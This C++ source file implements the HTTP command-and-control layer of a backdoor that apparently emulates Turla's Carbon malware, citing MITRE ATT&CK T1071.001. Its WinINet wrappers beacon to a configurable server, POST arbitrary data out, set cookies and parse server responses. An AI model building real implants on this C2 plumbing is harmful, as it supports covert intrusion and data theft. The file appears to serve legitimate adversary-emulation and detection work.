/*
 *  About:
 *      Handles C2 communications over HTTP.
 *  MITRE ATT&CK Techniques:
 *      T1071.001: Application Layer Protocol: Web Protocols
 *  CTI:
 *      https://www.welivesecurity.com/2017/03/30/carbon-paper-peering-turlas-second-stage-backdoor/
 */

#include <windows.h>
#include <wininet.h>
#include <strsafe.h>

#include <iostream>
#include <vector>
#include <locale>
#include <sstream>
#include <string>
#include <list>
#include <regex>

#include "HttpClient.hpp"
#include "Logging.hpp"

// Function is used lazily when hInternet or hConnect are needed.
// From https://docs.microsoft.com/en-us/windows/win32/wininet/http-sessions
bool HttpConnection::Connect(WinApiWrapperInterface* api_wrapper) {
    // Creates the first two handles for internet requests.
    if (hInternet == nullptr){
        hInternet = InternetOpenWrapper(
                httpUserAgent.c_str(),      // Name of application or entity making the request, pointer to null-terminated string.
                INTERNET_OPEN_TYPE_DIRECT,  // Type of access required
                NULL,                       // Proxy Name, pointer to null-terminated string or NULL.
                NULL,                       // Optional list of hostnames or IPs to send through proxy. Pointer to null-terminated string or NULL.
                0                           // Options
                );
        if (hInternet == NULL) {
            logging::LogMessage(api_wrapper, LOG_HTTP_CLIENT, LOG_LEVEL_ERROR, "InternetOpenWrapper failed. Error code: " + std::to_string(api_wrapper->GetLastErrorWrapper()));
        }
    }
    if (hInternet != nullptr && hConnect == nullptr){
        hConnect = InternetConnectWrapper(
            hInternet,                  // Handle from InternetOpenA, HINTERNET
            serverUrl.c_str(),          // Hostname or IP of server, pointer to null-terminated string.
            serverPort,                 // Server port
            NULL,                       // Username for server authentification, pointer to null-terminated string or NULL
            NULL,                       // Password for server auth, pointer to null-terminated string or NULL.
            INTERNET_SERVICE_HTTP,      // Type of service to access.
            0,                          // Options specific to servicce used
            0                           // For all syncronus contexts, this is set to 0.
        );
        if (hConnect == NULL) {
            logging::LogMessage(api_wrapper, LOG_HTTP_CLIENT, LOG_LEVEL_ERROR, "InternetConnectWrapper failed. Error code: " + std::to_string(api_wrapper->GetLastErrorWrapper()));
        }
    }
    return (hInternet != nullptr && hConnect != nullptr);
}

// Deconstructor for class - automatic closing of the handle when the shared pointer goes out of scope.
HttpConnection::~HttpConnection(){
    // If there are still some alive sessions, these need to be killed. 
    for (std::weak_ptr<HttpSession> sessionFromThisConnection : currentSessions){
        if (std::shared_ptr<HttpSession> sessionPtr = sessionFromThisConnection.lock()){
            sessionPtr.reset(); // Calling the destructor to reset the internet handle for their sessions.
            
        } // else the pointer has properly expired.
    }
    // Close internet handles in backwards order of construction
    if (hConnect != nullptr) InternetCloseHandle(hConnect);
    if (hInternet != nullptr) InternetCloseHandle(hInternet);
}

// Valid connections are not NULL. No other way to check for HttpConnection.
bool HttpConnection::IsValid(WinApiWrapperInterface* api_wrapper){
    return Connect(api_wrapper);
}

// There is some point when we know which HTTP version to use. Converting versions 10 and 11 to the proper strings.
bool HttpConnection::setHttpVersion(int newHttpVersion){
    if (newHttpVersion == 10) httpVersion = "HTTP/1.0";
    else if (newHttpVersion == 11) httpVersion = "HTTP/1.1";
    else return false;
    return true;
}

// This creates a small session to see if server is available, no data is requested or downloaded.
// If the server is not available, the session request fails, so this is enough of a check to see if server is alive.
bool HttpConnection::MakeSimpleConnection(WinApiWrapperInterface* api_wrapper, std::string resource){
    if (!Connect(api_wrapper)) return false;
    
    // Creating an httpSession with "GET"
    auto newSession = std::make_shared<HttpSession>(shared_from_this(), hConnect, "GET", resource, httpUserAgent, "", "", "");

    // Saving to the sessions list as a weak pointer just in case shared pointer doesn't automatically deconstruct.
    currentSessions.emplace_back(newSession);

    // Return boolean indicating if the http request was sent.
    bool sessionWasValid = newSession->ValidSession(api_wrapper); 

    return sessionWasValid;
}

// Starting a new session from connection
std::shared_ptr<HttpSession> HttpConnection::StartSession(WinApiWrapperInterface* api_wrapper, std::string resource, std::string uuid_override){
    if (!Connect(api_wrapper)) return nullptr;

    // Creating new session
    std::string uuid_val = uuid_override.length() == 0 ? uuid : uuid_override;
    auto newSession = std::make_shared<HttpSession>(shared_from_this(), hConnect, "GET", resource, httpUserAgent, httpVersion, uuid_val, serverUrl);
    // Saving to session list as a weak pointer to check in the future.
    currentSessions.emplace_back(newSession);

    return newSession;
}

// Set the connection timeout for the current hInternet handle.
// Source - https://docs.microsoft.com/en-us/windows/win32/api/wininet/nf-wininet-internetsetoptiona
bool HttpConnection::SetTimeout(WinApiWrapperInterface* api_wrapper, int numMinutes){
    if (!Connect(api_wrapper)) return false;
    DWORD numMilliSec = numMinutes * 60 * 1000;
    return InternetSetOptionWrapper(hConnect, INTERNET_OPTION_CONNECT_TIMEOUT, &numMilliSec, sizeof(DWORD));
}

// Set an http cookie
//https://learn.microsoft.com/en-us/windows/win32/wininet/managing-cookies
bool HttpConnection::setCookie(std::string cookieName, std::string cookieValue, bool persistant) {
    std::string fullServerUrl = serverUrl;
    if (!fullServerUrl.starts_with("http")){
        fullServerUrl = std::string("http://") + fullServerUrl;
    }
    
    std::string cookieData = "";
    cookieData.append(cookieName);
    cookieData.append(" = ");
    cookieData.append(cookieValue);
    if (persistant) cookieData.append("; expires = Sat,01-Jan-2000 00:00:00 GMT");
    
    return InternetSetCookieA(fullServerUrl.c_str(), NULL, cookieData.c_str());
}


// Start a session fron the session (this one is private)
bool HttpSession::StartSession(WinApiWrapperInterface* api_wrapper) {

    // If the incoming connection is ok and this connection hasn't yet been set, try to set it.
    if (connectionHandle != NULL && hHttpRequest == nullptr){
        LPCSTR accept_types[] = {"*/*", NULL}; // accept any MIME type
        hHttpRequest = HttpOpenRequestWrapper(
                        connectionHandle,           // Handle from InternetConnect, HINTERNET
                        "GET",                  // HTTP verb, null-terminated string or NULL
                        httpResource.c_str(),       // Target object, null-terminated string.
                        httpVersionStr.size() > 0 ? httpVersionStr.c_str() : NULL, // HTTP version as null-terminated string, NULL is default version 
                        httpReferer.size() > 0 ? httpReferer.c_str() : NULL,        // URL of the document from which the URL in the request was obtained, pointer to null-terminated string or NULL
                        accept_types,                   // Media types accepted by client. Null-terminated list of strings or NULL
                        INTERNET_FLAG_RELOAD | INTERNET_FLAG_NO_CACHE_WRITE,                      // Internet options
                        0                       // Pointer for association to application data.
                        );
        // Send full request only if the request was successful  
        if (hHttpRequest == NULL) {
            logging::LogMessage(api_wrapper, LOG_HTTP_CLIENT, LOG_LEVEL_ERROR, "HttpOpenRequestWrapper failed. Error code: " + std::to_string(api_wrapper->GetLastErrorWrapper()));
        }            
        else {
                
            requestSent = HttpSendRequestWrapper(
                            hHttpRequest,   // Handle from HttpOpenRequest, HINTERNET
                            NULL,           // Additional headers, pointer to string or NULL
                            0,              // Lenth of headers in TCHARs or -1L if string is null-terminated.
                            NULL,           // Optional data to be sent immediately after request headers, pointer to buffer or NULL
                            0               // Optional length in size of bytes
                            );
            if (!requestSent) {
                logging::LogMessage(api_wrapper, LOG_HTTP_CLIENT, LOG_LEVEL_ERROR, "HttpSendRequestWrapper failed. Error code: " + std::to_string(api_wrapper->GetLastErrorWrapper()));
            }
        }
    }

    return hHttpRequest != nullptr && requestSent;
}
// Send data by creating a post session
bool HttpSession::SendData(WinApiWrapperInterface* api_wrapper, void* data, DWORD dataLength) {

    // If the incoming connection is ok and this connection hasn't yet been set, try to set it.
    if (connectionHandle != NULL && hHttpRequest == nullptr){
        hHttpRequest = HttpOpenRequestWrapper(
                        connectionHandle,           // Handle from InternetConnect, HINTERNET
                        "POST",                     // HTTP verb, null-terminated string or NULL
                        httpResource.c_str(),       // Target object, null-terminated string.
                        httpVersionStr.size() > 0 ? httpVersionStr.c_str() : NULL, // HTTP version as null-terminated string, NULL is default version 
                        httpReferer.size() > 0 ? httpReferer.c_str() : NULL,        // URL of the document from which the URL in the request was obtained, pointer to null-terminated string or NULL
                        NULL,                   // Media types accepted by client. Null-terminated list of strings or NULL
                        0,                      // Internet options
                        0                       // Pointer for association to application data.
                        );
        // Send full request only if the request was successful  
        if (hHttpRequest == NULL) {
            logging::LogMessage(api_wrapper, LOG_HTTP_CLIENT, LOG_LEVEL_ERROR, "HttpOpenRequestWrapper failed. Error code: " + std::to_string(api_wrapper->GetLastErrorWrapper()));
        }            
        else {
            requestSent = HttpSendRequestWrapper(
                            hHttpRequest,   // Handle from HttpOpenRequest, HINTERNET
                            NULL,           // Additional headers, pointer to string or NULL
                            0,              // Lenth of headers in TCHARs or -1L if string is null-terminated.
                            data,           // Optional data to be sent immediately after request headers, pointer to buffer or NULL
                            dataLength      // Optional length in size of bytes
                            );
            if (!requestSent) {
                logging::LogMessage(api_wrapper, LOG_HTTP_CLIENT, LOG_LEVEL_ERROR, "HttpSendRequestWrapper failed. Error code: " + std::to_string(api_wrapper->GetLastErrorWrapper()));
            }
        }
    }

    return hHttpRequest != nullptr && requestSent;
}

// Deconstructor to close the session.
HttpSession::~HttpSession() {
    if (hHttpRequest != NULL) InternetCloseHandle(hHttpRequest); 
}

// Indicate if the http request was sent successfully. 
// If the server was not available, this will be false.
bool HttpSession::ValidSession(WinApiWrapperInterface* api_wrapper){
    return StartSession(api_wrapper);
}

// Get the number of bytes returned from the http request.
DWORD HttpSession::NumberBytesAvailable(WinApiWrapperInterface* api_wrapper){
    if (numberOfBytesReturned > 0) return numberOfBytesReturned;

    if (!ValidSession(api_wrapper)) {
        return 0;
    }

    bool retrievedNumDataAvailable = InternetQueryDataAvailableWrapper(
                                        hHttpRequest,           // Handle returned from HttpOpenRequet, HINERNET
                                        &numberOfBytesReturned, // Pointer to handle that receives bytes, may be null.
                                        0,                      // Reserved and must be 0
                                        0                       // Reserved and must be 0
                                        );
    
    if (!retrievedNumDataAvailable) {
        return 0;
    }
    else {
        return numberOfBytesReturned;
    }
}

// See https://docs.microsoft.com/en-us/windows/win32/wininet/http-sessions#downloading-resources-from-the-www
// Function broken up into a function for getting the number of bytes available and actually getting the data.
std::string HttpSession::GetData(WinApiWrapperInterface* api_wrapper){
    std::string defaultEmpty = "";
    DWORD total_bytes_read = 0;
    std::vector<char> v_response;

    // Read response
    char response_buffer[RESP_BUFFER_SIZE];
    DWORD num_bytes_read = 0;
    bool result; 
    do {
        result = InternetReadFileWrapper(
            hHttpRequest,
            response_buffer,
            RESP_BUFFER_SIZE,
            &num_bytes_read
        );
        if (!result) {
            logging::LogMessage(api_wrapper, LOG_HTTP_CLIENT, LOG_LEVEL_ERROR, "InternetReadFile failed. Error code: " + std::to_string(api_wrapper->GetLastErrorWrapper()));
            return defaultEmpty;
        }
        total_bytes_read += num_bytes_read;
        v_response.insert(v_response.end(), response_buffer, response_buffer + num_bytes_read);
    } while (num_bytes_read != 0);

    // If data is retrieved, then return it.
    if (total_bytes_read > 0){
        logging::LogMessage(api_wrapper, LOG_HTTP_CLIENT, LOG_LEVEL_DEBUG, "Data bytes read: " + std::to_string(total_bytes_read));
        return std::string(v_response.begin(), v_response.end());
    } else {
        logging::LogMessage(api_wrapper, LOG_HTTP_CLIENT, LOG_LEVEL_ERROR, "Error, no data read from server.");
    }
    return defaultEmpty;
}

// Extract the value from the "value" tag
std::string GetValueTagValue(std::string html_blob) {
    std::string name_tag_start = "<input name=\"";
    std::string value_tag_start = "value=\"";
    size_t name_tag_start_pos = html_blob.find(name_tag_start);
    if (name_tag_start_pos == std::string::npos) {
        return std::string("");
    }
    size_t value_tag_start_pos = html_blob.find(value_tag_start, name_tag_start_pos + name_tag_start.length());
    if (value_tag_start_pos == std::string::npos) {
        return std::string("");
    }
    size_t value_tag_end_pos = html_blob.find("\">", value_tag_start_pos + value_tag_start.length());
    if (value_tag_end_pos == std::string::npos) {
        return std::string("");
    }
    size_t start_pos = value_tag_start_pos + value_tag_start.length();
    size_t value_len = value_tag_end_pos - start_pos;
    if (value_len == 0) {
        return std::string("");
    }
    return html_blob.substr(start_pos, value_len);
}